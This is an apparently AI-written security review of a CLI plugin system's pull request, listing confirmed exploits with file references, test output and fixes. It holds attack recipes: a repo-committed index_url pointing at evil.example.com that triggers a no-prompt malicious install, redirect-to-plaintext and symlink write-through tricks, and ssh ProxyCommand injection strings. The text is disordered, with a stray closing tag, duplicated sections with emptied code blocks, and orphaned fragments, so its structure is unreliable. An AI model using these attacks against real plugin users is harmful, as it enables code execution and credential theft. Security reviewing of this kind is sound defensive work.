```
writeExecutable err = write binary: simulated network/disk failure mid-copy
BUG: previously working binary at .../entire-demo was destroyed by a failed copy
```
This is the *normal* path wherever `os.MkdirTemp("")` and the managed dir are on different filesystems (Linux with `/tmp` on tmpfs, a separate `$TMPDIR` mount). An upgrade interrupted by Ctrl+C or a full disk leaves `bin/entire-x` symlinked to a deleted file while the manifest still describes the old install — directly contradicting `replaceBinary`'s "moves src over dest atomically". Fix: copy to `pkgDir/.tmp-<rand>`, then `os.Rename` onto dest.

**11. `plugin doctor`'s suggested fix for a `repo_url`-only dependency is a command that cannot work** — CONFIRMED
`plugin_deps.go:350-356` always emits `entire plugin install <name>`, which resolves only through the index (`plugin_group.go:168-177`).
```
doctor: parent: requires "child", which is not installed
     fix: run: entire plugin install child     ← child is not in any index; this errors
```
`req.RepoURL` is available in the manifest. Fix: prefer it when set.

**12. Non-`sha256sum` checksum formats are reported as "no checksums published"** — CONFIRMED
`plugin_fetch.go:192-203` requires exactly two whitespace fields.
```
bsd-format parse:            map[]      ("SHA256 (file) = hash", i.e. shasum --tag)
filename-with-space parse:   map[]
crlf parse:                  map[file.tar.gz:abc123]   ✓
binary-marker parse:         map[file.tar.gz:abc123]   ✓
```
The install then falls to the probe path and emits `... publishes <asset> but no checksums.txt to authenticate it` — factually wrong, and it steers the user to `--allow-unverified`. Fix: accept the BSD tagged form; at minimum reword to "no parseable checksums at <url>".

**13. A marker mtime in the future freezes the index cache indefinitely** — CONFIRMED
`plugin_index.go:199-204`: `fresh = time.Since(info.ModTime()) < ttl` is negative-and-therefore-"fresh" when the marker is ahead of now (clock rollback, restored backup, bad container/NFS clock). With the marker set 400 days ahead and a new plugin published upstream, the second sync still returns the old catalog; only `plugin index update` recovers. Fix: `age := time.Since(mtime); fresh = age >= 0 && age < ttl`.

**14. `plugins.index_ttl_hours` overflows to a negative duration** — CONFIRMED
`settings/settings.go:207-212`; `Validate` (`:191`) only rejects `< 0`.
```
index_ttl_hours=2562047  -> 2562047h0m0s
index_ttl_hours=2562048  -> -2562047h34m33.7s   (negative → index ALWAYS stale)
index_ttl_hours=10000000 -> -248191h9m7.4s
index_ttl_hours=1<<62    -> 0s
Validate accepts index_ttl_hours=4611686018427387904
```
A user asking for "effectively never re-sync" gets "re-sync on every command". Fix: clamp hours in `Validate`, or saturate the multiply.

**15. A fixed `download_url` with no archive extension installs the archive as the binary and reports success** — CONFIRMED
`plugin_fetch.go:430-445` picks the format purely from the filename suffix; `assetNameFromURL` on `https://host/latest/download` yields `download` → default branch → raw copy.
```
install reported success: tag=v0.1.0 asset="download"
installed 'binary' first bytes: "\x1f\x8b\b\x00"   (gzip magic)
```
`binary_sha256` is then computed over the gzip bytes, so `plugin doctor` *confirms the corrupt install as intact*. `entire demo` dies with an exec-format error. Fix: sniff magic bytes (`\x1f\x8b`, `PK\x03\x04`) when the suffix is unrecognized.

---

## Lower severity

**16. Locale-fragile control flow for "metadata file absent"** — SPECULATIVE
`plugin_gitremote.go:183-192` decides the benign "no metadata" case by substring-matching git's **English** stderr (`does not exist`, `exists on disk, but not in`), and `gitQuiet` (`:27-31`) does not pin `LC_ALL`. Those strings are translated in git builds with NLS (Debian/Fedora ship `git.mo`). On a localized Linux host, every plugin repo *without* an `entire-plugin.yml` — the documented default — would fail to install. I could not reproduce: Apple Git 2.50.1 here ships no catalogs (verified: no `git.mo` on the box, message identical under `de_DE`/`fr_FR`/`ja_JP`). Cheap fix: `LC_ALL=C` in `gitQuiet`, or use `git cat-file -e <tag>:<path>` and branch on exit status.

**17. No timeout on any git subprocess** — read-confirmed
`pluginHTTPClient` bounds downloads at 5 min, but `gitQuiet` (`ls-remote`, up to two `clone`s *per tag*, index `fetch`) inherits only the command ctx. A black-holed git host hangs `entire plugin install` indefinitely. `GIT_TERMINAL_PROMPT=0` also doesn't stop **ssh** prompting for a key passphrase on `/dev/tty`, so an `ssh://` index blocks in CI. Consider per-operation `context.WithTimeout` + `GIT_SSH_COMMAND=ssh -oBatchMode=yes`.

**18. Partial dependency failure is opaque and leaves a mixed state** — CONFIRMED
`plugin_deps.go:249-257` aborts on the first failure; the "Installed dependency %q" lines print only after the whole plan succeeds (`plugin_group.go:298-303`).
```
ExecuteDepPlan err = install dependency "broken": release downloads need an http(s) repo URL, got ...
after partial failure: demo installed=true broken installed=false
```
The command exits non-zero (after already printing that the root plugin installed fine) and never tells the user that `demo` did land. Consider per-action progress output and continuing past a failed action.

**19. Concurrent installs of the same plugin are unserialized** — SPECULATIVE (did not reproduce in 12 attempts)
`SyncPluginIndex` takes a flock; `installRepoAtTag` takes none. Interleaving: P1 `replaceBinary` → P2 `replaceBinary` → P1 `fileSHA256(pkgBin)` reads P2's bytes → P1's manifest pairs its own tag with P2's digest, and `doctor` then reports "modified or replaced outside entire" for a benign race. `SavePluginManifest`'s non-atomic `os.WriteFile` has the same shape. A flock on `pkg/<name>` closes it.

**20. Smaller read-confirmed items**
- `sort.Slice` in `listRemoteSemverTags` is unstable, so semver-equal tags resolve arbitrarily: `[1.0.0 v1.0.0 v1.0.0+build7] -> tags[0]="1.0.0"`.
- `maxTagFallbacks` exhaustion names only the *last* tag tried, with no hint that just 3 tags were considered or that older tags exist.
- `httpGetSmall` (`plugin_fetch.go:355`) truncates `checksums.txt` at 1 MiB with a bare `io.LimitReader` — the exact invisible-truncation hazard `writeExecutableLimited` was hardened against. A large release loses lines (→ spurious "unverified") or gets a half-hex last line (→ spurious checksum mismatch).
- `normalizeRepoURL` (`plugin_index.go:112`) is case-sensitive and doesn't collapse `//`, so `https://GitHub.com/o/r` reads as "not in the index" and prompts on a legitimately listed repo.
- `extractFromTarGz`/`extractFromZip` take the *first* basename match: an archive with `docs/entire-x` before `bin/entire-x` installs the wrong file.
- `plugin upgrade <name> --all` silently ignores `--all` (`plugin_group.go:465-479`).
- `plugin upgrade` never re-plans dependencies, so a `requires` entry introduced by an upgrade is never installed (doctor-only).

---

## Probed and found solid (negative results)

- `parseChecksums`: CRLF and the `*` binary-mode marker both handled; digest comparison is `strings.EqualFold`, so uppercase manifests work.
- `fetchAndVerify`'s asset-name guard rejects `""`, `.`, `..`, `/`, `\`, and anything `!= filepath.Base` — staging-dir escape looks closed.
- `safeArchiveEntry` + `Typeflag != tar.TypeReg` / `IsDir()` block `../`, absolute paths, NUL, and symlink/hardlink entries; a hostile archive can't write outside dest.
- `validatePluginRepoURL` rejects `ext::`, leading `-`, relative paths and bare names; with `--` before positionals the git-argument-injection surface looks closed. `SyncPluginIndex` validates `--index`/env values too, not just settings.
- `requireSecureAssetURL` gates both the asset fetch *and* the checksum fetch, including the author-declared `download_url`.
- `writeExecutableLimited`'s `limit+1` read genuinely detects overflow — no silent truncation.
- `maxDepDepth` + the strictest-`min_version` `considered` map terminate an A↔B metadata cycle (no hang, no duplicate actions).
- A refresh failure warns and serves the cached copy, but a *corrupt* `index.json` still surfaces as a parse error rather than masquerading as offline.
- The interrupted-clone sweep (`!cloned` → `RemoveAll` → clone) does recover a partial cache dir, and the flock's sibling-path placement is correct — a lock file inside `dir` would be deleted by that `RemoveAll`.
- Pre-existing plugin test suite is green on this branch (`ok … 17.5s`).</result>

# Plugin system security review — PR #1422

**9 confirmed by execution, 6 confirmed by code reading, 4 speculative.** The archive-extraction hardening is genuinely solid. The trust model around *who chooses the index* is not, and the "verified download" story has a hole that reopens the plaintext-HTTP issue that was supposedly fixed.

---

## 1. CRITICAL — A cloned repo silently installs attacker binaries via `plugins.index_url`

**CONFIRMED by execution.** `cmd/entire/cli/plugin_index.go:120-136`, `cmd/entire/cli/plugin_group.go:162-183`, `cmd/entire/cli/settings/settings.go:187-203`

Two decisions compose into remote code execution:
- `resolvePluginIndexURL` reads `plugins.index_url` from `.entire/settings.json` — a **committed, repo-controlled** file (`plugin_index.go:127-134`).
- Index-resolved installs set `trusted = true` and **never prompt** (`plugin_group.go:182-183`, gate at `:193`).

Attack: attacker publishes any repo containing
```json
{"plugins":{"index_url":"https://evil.example.com/plugin-index"}}
```
Victim clones it and runs `entire plugin install <any-name-in-that-index>`. No prompt, no `--yes`, no warning. Attacker's binary is downloaded, chmod 0755, linked into the managed bin dir, and dispatchable.

My integration test (repo with only that one committed file, no env var, no `--index`):
```
stdout: Installed plugin "pwn" v0.1.0 from file:///...
stderr:
RESULT: EXPLOITED — repo-committed plugins.index_url caused a no-prompt install
of an attacker binary, now executable as `entire pwn`: "pwn-ran-v0.1.0"
```

The index-listed-means-trusted rule is only defensible when the index identity is *not* attacker-controlled. Fixes: refuse `plugins.index_url` from project `settings.json` (accept it only from `settings.local.json` / `--index` / env), or prompt once per never-before-seen index URL showing the URL, or at minimum print the effective index URL on every install and require `--yes` when it isn't the built-in default.

Note this also makes the `official: true` badge (`plugin_index.go:60`, printed at `plugin_group.go:551-553` and `:590`) a forgeable trust signal — my exploit index set `official:true`.

## 2. HIGH — `requireSecureAssetURL` is defeated by an HTTPS→HTTP redirect

**CONFIRMED by execution.** `cmd/entire/cli/plugin_fetch.go:84`, checked only at `:340` and `:378`

```go
var pluginHTTPClient = &http.Client{Timeout: 5 * time.Minute}
```

No `CheckRedirect`. Go's default follows up to 10 redirects **across schemes**, and the final URL is never re-validated. Both byte-fetching paths are affected — the asset (`fetchAndVerify`) and the checksum manifest (`httpGetSmall`).

```
PLAINTEXT server hit: GET /entire-adv
RESULT: EXPLOITED — https:// entry point delivered bytes over plaintext http.
  content="#!/bin/sh\necho PWNED\n"

PLAINTEXT checksums server hit: /checksums.txt
RESULT: EXPLOITED — checksums.txt fetched over plaintext http after redirect
```

This voids the reasoning in the `requireSecureAssetURL` doc comment verbatim: the asset *and* its `checksums.txt` can both be served over plaintext to a network attacker, so "checksum verification becomes theatre" — exactly the outcome the function was written to prevent. An `https://` `download_url` in `entire-plugin.yml` is enough to trigger it; so is any legit host with an open redirect. Fix: `CheckRedirect: func(req *http.Request, via []*http.Request) error { return requireSecureAssetURL(req.URL.String()) }` plus a hop cap.

## 3. HIGH — On macOS/Windows, installing plugin A silently overwrites plugin B's binary

**CONFIRMED by execution on this machine (APFS).** `plugin_install_remote.go:97-135`, `plugin_store.go:130-147`, `plugin_store.go:284-295`

`validatePluginName` permits uppercase; `FindInstalledPlugin` compares names with `p.Name == name` (exact, case-sensitive); but `pkg/<name>/` and `bin/entire-<name>` land on a **case-insensitive** filesystem. So a repo whose `entire-plugin.yml` declares `name: Run` passes the "already installed?" guard while writing to the same paths as an installed `run`:

```
victim installed: .../pkg/run/entire-run ("LEGIT-RUN-BINARY")
guard did NOT fire: FindInstalledPlugin("Run") = nil even though "run" is installed
attacker pkg dir: .../pkg/Run
bin/ entries: [entire-run]        <- one entry, not two
pkg/ entries: [run]               <- one dir, not two
LoadPluginManifest("run") now reports name="Run" repo="https://github.com/attacker/entire-Run" tag="v9.9.9"
RESULT: EXPLOITED — .../pkg/run/entire-run content is now "ATTACKER-PAYLOAD"
  (was "LEGIT-RUN-BINARY"); no --force, no prompt
```

The victim's binary, bin entry, and manifest are all replaced. The user installed an unrelated plugin. Fix: canonicalize plugin names (reject uppercase, or fold to lower before all path/lookup use) and make the installed-check case-insensitive on case-insensitive filesystems.

## 4. HIGH — The installed name is chosen by the remote, not by the user

**CONFIRMED by execution.** `plugin_install_remote.go:97-108`

`name` comes from `meta.Name` in the remote's `entire-plugin.yml`; nothing reconciles it with the index entry name or the user's argument.

```
$ entire plugin install safe          # index entry "safe"
Installed plugin "hijack" v0.1.0 from file:///...
$ entire hijack
hijack-ran-v0.1.0                     # dispatchable
$ entire safe
(exit status 1)                       # what the user asked for doesn't exist
```

Consequences: (a) name-squatting any not-yet-installed plugin name with zero prompts via an index entry; (b) **`--force` scope escalation** — the guard at `:104-108` tests `opts.Force` against the *remote-declared* name, so `entire plugin install A --force` (a user reinstalling A) lets A's repo declare `name: B` and force-replace an unrelated installed plugin B. Fix: when the name is known up front (index entry or requirement), require `meta.Name` to match it, or install under the requested name.

## 5. HIGH — `git://` and `http://` accepted for index and plugin repos

**CONFIRMED by execution.** `plugin_gitremote.go:36`

```go
var pluginRepoURLSchemes = []string{"https://", "http://", "ssh://", "git://", "file://"}
```

`git://` has no authentication or encryption at all; `http://` likewise. Probing the CLI:
```
index=git://evil.example.com/plugin-index  -> ACCEPTED by validator (reached git)
index=http://evil.example.com/plugin-index -> ACCEPTED by validator (reached git)
```

A network attacker who can MITM a `git://` or `http://` index owns `index.json`, therefore `repo_url`, therefore (via a MITM'd `entire-plugin.yml`) `download_url` and `name` — and index installs never prompt. Chained with #2 they don't even need the plaintext transport for the asset itself.

Note the inconsistency: `settings.PluginSettings.Validate` (`settings/settings.go:197`) correctly allows only `https/ssh/file/git@` — but `--index` and `ENTIRE_PLUGIN_INDEX_URL` bypass it entirely, going only through `validatePluginRepoURL` (`plugin_index.go:167`), which is *more* permissive than the settings validator it claims to mirror (`plugin_gitremote.go:33-35`). The comment says "Mirrors settings.PluginSettings.Validate's allowlist" — it does not. Drop `http://` and `git://`; if `git://` must stay for internal mirrors, gate it behind an explicit setting.

## 6. MEDIUM — Dependency confirmation names a different plugin than the one installed

**CONFIRMED by execution.** `plugin_deps.go:150`/`:249-257`, `plugin_group.go:265-271`/`:301-303`

The plan displays and records `a.Name` from the *requiring* plugin's metadata, but `ExecuteDepPlan` → `InstallPluginFromRepo` re-derives the name from the dependency repo. The success line prints `a.Name` too, so the deception is complete:

```
This plugin requires 1 additional plugin(s):
  innocent  (file:///...)  ← not in the plugin index
Installed dependency "innocent"

$ entire realname
realname-ran-v0.1.0        # <- what actually got installed

$ entire plugin doctor
root: requires "innocent", which is not installed
```

The user confirms "innocent", `entire-realname` lands on PATH, and doctor then reports the confirmed dependency as missing. Fix: verify the installed name equals `a.Name` and fail the action otherwise; print the actual installed name.

## 7. MEDIUM — Unbounded pre-confirmation network fan-out to attacker-chosen URLs

**Confirmed by code reading.** `plugin_deps.go:184-202`

For every distinct unsatisfied requirement, planning runs `listRemoteSemverTags` (`git ls-remote`) **and** `fetchPluginMetadataAtTag` (a full `git clone` into a temp dir) — before the dependency confirmation prompt, and with no prompt at all on the index path. `requires[]` length is unbounded, entries are deduped by *name* only (not repo URL), and `maxDepDepth` bounds depth but not breadth.

So one hostile `entire-plugin.yml` yields N git clones to N attacker-chosen URLs, executed with the user's git credential helpers and proxy config active, and `file://` / absolute paths / `git://host:9418` are all accepted targets — an SSRF and internal-host-probing primitive plus an amplification DoS. Cap the total number of planned actions and distinct remotes, and dedupe on normalized repo URL.

## 8. MEDIUM — Credentials in URLs leak to stderr, repo logs, and support bundles

**CONFIRMED by execution.** `plugin_index.go:216`/`:221-222`, `plugin_gitremote.go:108`/`:178`, `plugin_manifest.go:191-204`, `plugin_deps.go:327`/`:397`/`:405`

```
stderr=clone plugin index REDACTED
  exit status 128: fatal: ...
RESULT: LEAK — the index URL's password appears verbatim in user-facing stderr
```

Worse than stderr, three persistence paths:
- `logging.Warn(ctx, "plugin index refresh failed...", slog.String("index", indexURL))` (`plugin_index.go:221-222`) writes the credentialed URL to `.entire/logs/entire.log` (`logging.LogsDir = ".entire/logs"`) — **inside the user's working tree**.
- `entire doctor bundle` zips `.entire/logs/` wholesale (`doctor_bundle.go:105-106`), so the secret rides into any support bundle the user shares.
- `SavePluginManifest` writes `repo_url` verbatim to `pkg/<name>/manifest.yml` at mode **0644**.

This also violates the repo's own logging rule in `CLAUDE.md` ("Privacy: Don't log user content… Log only operational metadata"). Fix: strip userinfo from every URL before logging, printing, or persisting (`u.User = nil`), and scrub git's stderr in `stderrSuffix`.

## 9. MEDIUM — `binary_sha256` / `plugin doctor` integrity check is self-defeating

**CONFIRMED by execution.** `plugin_deps.go:375-409`, `plugin_manifest.go:201`

The expected digest lives in `pkg/<name>/manifest.yml` — mode 0644, same directory as the binary, no signature. Anything that can swap the binary can re-record the digest:

```
naive tamper -> doctor issues: 1  [managed binary no longer matches the digest recorded at install]
manifest.yml mode = -rw-r--r-- (writable by anything running as the user)
RESULT: EXPLOITED — binary swapped to "EVIL" and doctor reports NO integrity issue
  (digest re-recorded in the sibling manifest); doctor's suggested reinstall URL
  is now "https://attacker/entire-adv"
```

Any installed plugin — which already executes as the user — can do this to every *other* plugin. This is fix #4 from the "already covered" list; it detects accidental corruption, not an adversary, and the doc comment at `plugin_manifest.go:60-64` ("Recording the binary is what lets `plugin doctor` detect post-install tampering") overstates it. Note the second-order problem: doctor's `Fix` strings interpolate the now-attacker-controlled `m.RepoURL` into a copy-pasteable `entire plugin install <url> --force`.

## 10. MEDIUM — Symlink write-through on the cross-device install fallback

**CONFIRMED by execution.** `plugin_install_remote.go:250`, `plugin_fetch.go:548`

`replaceBinary` tries `os.Rename` (which safely replaces a symlink), but the cross-device fallback calls `writeExecutable` → `os.OpenFile(destPath, O_WRONLY|O_CREATE|O_TRUNC, 0o755)` — no `O_EXCL`, no `O_NOFOLLOW`. Staging is `os.MkdirTemp` (tmpfs on most Linux hosts) while `pkg/` is under `$HOME`, so the fallback is the *normal* path there, not an edge case.

```
RESULT: EXPLOITED — writeExecutable followed the symlink;
  .../victim.txt now "ATTACKER-PAYLOAD" mode=-rw-------
```

A pre-placed symlink at `pkg/<name>/entire-<name>` redirects the write to any path the user can write (`~/.zshrc`, `~/.ssh/authorized_keys`, a git hook). Combined with #3 or #9, a first malicious plugin plants the link and a later install of any second plugin fires it. Fix: `O_NOFOLLOW` (or unlink dest first, or write-to-temp-then-rename inside the pkg dir).

## 11. MEDIUM — Tag-walk is an unprotected version-rollback

`plugin_install_remote.go:72-88` — on `errAssetNotFound` the install walks down up to `maxTagFallbacks = 3` tags, warning only on stderr (`plugin_group.go:220-222`). Anyone who can 404 the newest tag's assets (the author, a compromised release host, a CDN, a path-selective MITM) forces a fresh install onto an older, known-vulnerable release. `UpgradeInstalledPlugin` has a semver floor (`:206`, `:221`) but fresh installs have none. Consider recording a rollback floor, or refusing to silently install a tag older than the newest one *listed*.

## 12. MEDIUM (design) — "Verified" means integrity, not authenticity

`plugin_fetch.go:219-231`, `:418-423`. `Verified: wantDigest != ""` where `wantDigest` came from `checksums.txt` **on the same origin as the asset**. An attacker who controls the release controls both, so `checksums.txt` proves only that the bytes weren't corrupted in transit. Yet `Verified` gates `--allow-unverified`, is surfaced by doctor as a security property, and `plugin install`'s help text says the asset "is downloaded over HTTPS and verified" (`plugin_group.go:103-105`).

I could not find a way to get `Verified: true` on bytes whose digest wasn't enforced, and I could not find a bypass of the `--allow-unverified` gate — see negatives below. The gap is what verification *means*, not whether it runs. Since index-listed repos install with no prompt, the whole chain rests on the index's curation plus TLS. Real authenticity needs publisher signatures (minisign/cosign) with a key pinned in the index entry.

## LOW

- **No locking on the plugin store; TOCTOU across the download.** `plugin_install_remote.go:104-108` checks "already installed", then downloads (seconds to minutes), then calls `InstallPluginFromPath(..., Force: true)` unconditionally at `:146`. Two concurrent installs of the same name → the second force-overwrites with no `--force`. The flock fix (#7 in the covered list) protected the index cache (`plugin_index.go:189`) but not the store.
- **`isAbsoluteGitPath` accepts Windows drive syntax on every platform.** `plugin_gitremote.go:88-95`. Confirmed: `c://x`, `z:/x`, `s://evil/x`, `e:\x` all validate on macOS. Not exploitable today (git resolves `X://` to a nonexistent `git-remote-X` helper) but it's an unintended hole in a security boundary — gate it on `runtime.GOOS == windows`.
- **Stale index served silently on refresh failure.** `plugin_index.go:219-225` logs a warning to the log file only; nothing reaches the user's terminal. An attacker who can block the index fetch freezes the catalog (and any de-listing/revocation) indefinitely.
- **Index cache key is 48 bits and refresh ignores the requested URL.** `plugin_index.go:155-156` uses `sum[:6]`; `refreshPluginIndexClone` (`:234`) fetches from the clone's `origin`, never checking it matches `indexURL`. So a cache-key collision permanently repoints the default index at an attacker remote. I did **not** find a collision (3M candidates, all distinct — it's a ~2^48 preimage, not a birthday problem), so this is a hardening item, not a confirmed exploit. Use the full digest and verify `origin` before reusing a clone.
- **Unbounded gzip inflation for skipped tar entries.** `plugin_fetch.go:478-491`. The *matched* entry is capped, but `tar.Reader.Next()` must inflate-and-discard every entry it skips, with no cap. Measured 1029:1; a 512 MiB asset (the max) implies ~0.5 TiB of inflation, ~100s of CPU. Bounded and modest — DoS only.
- **`localhost` plaintext exemption depends on name resolution.** `plugin_fetch.go:72-80` exempts the literal string `localhost` before any resolution, so a hostile resolver/`/etc/hosts` could route it off-machine. Prefer resolving and checking the IP, or exempt only literal loopback IPs.

## 2. HIGH — `requireSecureAssetURL` is defeated by an HTTPS→HTTP redirect

**CONFIRMED by execution.** `cmd/entire/cli/plugin_fetch.go:84`, checked only at `:340` and `:378`

```go

```

No `CheckRedirect`. Go's default follows up to 10 redirects **across schemes**, and the final URL is never re-validated. Both byte-fetching paths are affected — the asset (`fetchAndVerify`) and the checksum manifest (`httpGetSmall`).

```
PLAINTEXT server hit: GET /entire-adv
RESULT: EXPLOITED — https:// entry point delivered bytes over plaintext http.

PLAINTEXT checksums server hit: /checksums.txt
RESULT: EXPLOITED — checksums.txt fetched over plaintext http after redirect
```

## 3. HIGH — On macOS/Windows, installing plugin A silently overwrites plugin B's binary

**CONFIRMED by execution on this machine (APFS).** `plugin_install_remote.go:97-135`, `plugin_store.go:130-147`, `plugin_store.go:284-295`

`validatePluginName` permits uppercase; `FindInstalledPlugin` compares names with `p.Name == name` (exact, case-sensitive); but `pkg/<name>/` and `bin/entire-<name>` land on a **case-insensitive** filesystem. So a repo whose `entire-plugin.yml` declares `name: Run` passes the "already installed?" guard while writing to the same paths as an installed `run`:

```

guard did NOT fire: FindInstalledPlugin("Run") = nil even though "run" is installed
attacker pkg dir: .../pkg/Run

pkg/ entries: [run]               <- one dir, not two

RESULT: EXPLOITED — .../pkg/run/entire-run content is now "ATTACKER-PAYLOAD"
  (was "LEGIT-RUN-BINARY"); no --force, no prompt
```

The victim's binary, bin entry, and manifest are all replaced. The user installed an unrelated plugin. Fix: canonicalize plugin names (reject uppercase, or fold to lower before all path/lookup use) and make the installed-check case-insensitive on case-insensitive filesystems.

## 7. MEDIUM — Unbounded pre-confirmation network fan-out to attacker-chosen URLs

**Confirmed by code reading.** `plugin_deps.go:184-202`

For every distinct unsatisfied requirement, planning runs `listRemoteSemverTags` (`git ls-remote`) **and** `fetchPluginMetadataAtTag` (a full `git clone` into a temp dir) — before the dependency confirmation prompt, and with no prompt at all on the index path. `requires[]` length is unbounded, entries are deduped by *name* only (not repo URL), and `maxDepDepth` bounds depth but not breadth.

## 10. MEDIUM — Symlink write-through on the cross-device install fallback

**CONFIRMED by execution.** `plugin_install_remote.go:250`, `plugin_fetch.go:548`

Staging is `os.MkdirTemp` (tmpfs on most Linux hosts) while `pkg/` is under `$HOME`, so the fallback is the *normal* path there, not an edge case.


`plugin_install_remote.go:72-88` — on `errAssetNotFound` the install walks down up to `maxTagFallbacks = 3` tags, warning only on stderr (`plugin_group.go:220-222`). ## 12. MEDIUM (design) — "Verified" means integrity, not authenticity

`plugin_fetch.go:219-231`, `:418-423`. `Verified: wantDigest != ""` where `wantDigest` came from `checksums.txt` **on the same origin as the asset**. An attacker who controls the release controls both, so `checksums.txt` proves only that the bytes weren't corrupted in transit. Yet `Verified` gates `--allow-unverified`, is surfaced by doctor as a security property, and `plugin install`'s help text says the asset "is downloaded over HTTPS and verified" (`plugin_group.go:103-105`).

I could not find a way to get `Verified: true` on bytes whose digest wasn't enforced, and I could not find a bypass of the `--allow-unverified` gate — see negatives below. The gap is what verification *means*, not whether it runs. Since index-listed repos install with no prompt, the whole chain rests on the index's curation plus TLS. Real authenticity needs publisher signatures (minisign/cosign) with a key pinned in the index entry.

## LOW

- **No locking on the plugin store; TOCTOU across the download.** `plugin_install_remote.go:104-108` checks "already installed", then downloads (seconds to minutes), then calls `InstallPluginFromPath(..., Force: true)` unconditionally at `:146`. Two concurrent installs of the same name → the second force-overwrites with no `--force`. The flock fix (#7 in the covered list) protected the index cache (`plugin_index.go:189`) but not the store.
- **`isAbsoluteGitPath` accepts Windows drive syntax on every platform.** `plugin_gitremote.go:88-95`. Confirmed: `c://x`, `z:/x`, `s://evil/x`, `e:\x` all validate on macOS. Not exploitable today (git resolves `X://` to a nonexistent `git-remote-X` helper) but it's an unintended hole in a security boundary — gate it on `runtime.GOOS == windows`.
- **Stale index served silently on refresh failure.** `plugin_index.go:219-225` logs a warning to the log file only; nothing reaches the user's terminal. An attacker who can block the index fetch freezes the catalog (and any de-listing/revocation) indefinitely.
- **Index cache key is 48 bits and refresh ignores the requested URL.** `plugin_index.go:155-156` uses `sum[:6]`; `refreshPluginIndexClone` (`:234`) fetches from the clone's `origin`, never checking it matches `indexURL`. So a cache-key collision permanently repoints the default index at an attacker remote. I did **not** find a collision (3M candidates, all distinct — it's a ~2^48 preimage, not a birthday problem), so this is a hardening item, not a confirmed exploit. Use the full digest and verify `origin` before reusing a clone.
- **Unbounded gzip inflation for skipped tar entries.** `plugin_fetch.go:478-491`. The *matched* entry is capped, but `tar.Reader.Next()` must inflate-and-discard every entry it skips, with no cap. Measured 1029:1; a 512 MiB asset (the max) implies ~0.5 TiB of inflation, ~100s of CPU. Bounded and modest — DoS only.
- **`localhost` plaintext exemption depends on name resolution.** `plugin_fetch.go:72-80` exempts the literal string `localhost` before any resolution, so a hostile resolver/`/etc/hosts` could route it off-machine. Prefer resolving and checking the IP, or exempt only literal loopback IPs.

**ssh option injection is blocked — but by git, not by this code.** `ssh://-oProxyCommand=id/x` and `ssh://x@-oProxyCommand=id/x` are ACCEPTED by `validatePluginRepoURL`. git 2.50.1 stops them (`fatal: strange hostname '-oProxyCommand=touch${IFS}' blocked` / `hostname contains invalid characters`), and `/tmp/ADV_PWNED` was never created. Not exploitable today; noted only because the allowlist is relying on a downstream check it doesn't mention.

**No checksum-verification bypass found.** I specifically attacked the area flagged in the charge. The manifest loop's fall-through (`plugin_fetch.go:272-282`) lands on the probe fallback, which refuses without `--allow-unverified` (`:307-311`) and returns `errUnverifiedAsset`, which `InstallPluginFromRepo` correctly treats as non-retryable (`plugin_install_remote.go:85`). **Asset-name path traversal is closed.** `fetchAndVerify`'s guard (`plugin_fetch.go:374-377`) rejects `""`, `.`, `..`, anything with `/` or `\`, and anything where `asset != filepath.Base(asset)`. `assetNameFromURL` can only yield values that guard catches.

`cmd/entire/cli/plugin_install_remote.go:196-224`

Scenario: installed `v0.2.0`; author pushes `v0.3.0` (release still building, no asset) and yanks the bad `v0.2.0` release. Walk: v0.3.0 miss → v0.2.0 miss → v0.1.0 hit.

```
installed: v0.2.0 payload="payload-0.2.0"
upgrade outcome: &{Name:demo Pinned:false UpToDate:true FromTag: ToTag:}
manifest tag now: v0.1.0
installed payload now: "payload-0.1.0"
```

The user sees `demo   up to date`, exit 0, while the binary and manifest were rolled back a version. Fix: pass a floor tag into `InstallPluginFromRepo` (skip any tag `<= m.Tag`), or fail without touching state.

**2. macOS universal binaries can never be installed; the documented `darwin_all` fallback does not exist** — CONFIRMED

`plugin_gitremote.go:117-124`, `plugin_install_remote.go:61-74`

`semver.Compare` ranks `v2.0.0-rc1` above stable `v1.9.0`:
```

```
So `entire plugin install <url>` and especially `plugin upgrade --all` migrate every user onto release candidates the moment an author pushes one — no warning, no opt-out flag. It compounds with `maxTagFallbacks = 3`: two prereleases plus one asset-less tag exhaust the budget and the stable release is never reached. after:  tag=v0.2.0 pinned=false

The apt-style confirmation listing (`plugin_group.go:265-271`) never mentions that the target is pinned. comment only     -> meta=<nil> err=parsing entire-plugin.yml: EOF
```
empty document   -> meta=&{   []} err=<nil>     (--- is fine)
```

```
stdout: Installed plugin "other" v0.1.0 from file:///...
BUG: `entire plugin install demo` installed something else; 'demo' is not available
```
Worse for dependencies: `ExecuteDepPlan` "succeeds", `dependencySatisfied("demo")` stays false, so every subsequent parent install re-plans the same install and `doctor` reports the gap permanently. Fix: error when `meta.Name` disagrees with a name that came from the index or from `requires[].name`.

**10. The cross-device copy fallback destroys the working binary on failure and is not atomic** — CONFIRMED (primitive proven)
`plugin_install_remote.go:227-255` → `writeExecutable` → `plugin_fetch.go:547-567`

`writeExecutableLimited` opens `dest` with `O_TRUNC` **in place** and `os.Remove(destPath)` on any copy error:
```
writeExecutable err = write binary: simulated network/disk failure mid-copy
BUG: previously working binary at .../entire-demo was destroyed by a failed copy
```
This is the *normal* path wherever `os.MkdirTemp("")` and the managed dir are on different filesystems (Linux with `/tmp` on tmpfs, a separate `$TMPDIR` mount). An upgrade interrupted by Ctrl+C or a full disk leaves `bin/entire-x` symlinked to a deleted file while the manifest still describes the old install — directly contradicting `replaceBinary`'s "moves src over dest atomically". Fix: copy to `pkgDir/.tmp-<rand>`, then `os.Rename` onto dest.

**11. `plugin doctor`'s suggested fix for a `repo_url`-only dependency is a command that cannot work** — CONFIRMED
`plugin_deps.go:350-356` always emits `entire plugin install <name>`, which resolves only through the index (`plugin_group.go:168-177`).
```
doctor: parent: requires "child", which is not installed
     fix: run: entire plugin install child     ← child is not in any index; this errors
```
`req.RepoURL` is available in the manifest. Fix: prefer it when set.

**12. Non-`sha256sum` checksum formats are reported as "no checksums published"** — CONFIRMED
`plugin_fetch.go:192-203` requires exactly two whitespace fields.
```
bsd-format parse:            map[]      ("SHA256 (file) = hash", i.e. shasum --tag)
filename-with-space parse:   map[]
crlf parse:                  map[file.tar.gz:abc123]   ✓
binary-marker parse:         map[file.tar.gz:abc123]   ✓
```
The install then falls to the probe path and emits `... publishes <asset> but no checksums.txt to authenticate it` — factually wrong, and it steers the user to `--allow-unverified`. Fix: accept the BSD tagged form; at minimum reword to "no parseable checksums at <url>".

**13. A marker mtime in the future freezes the index cache indefinitely** — CONFIRMED
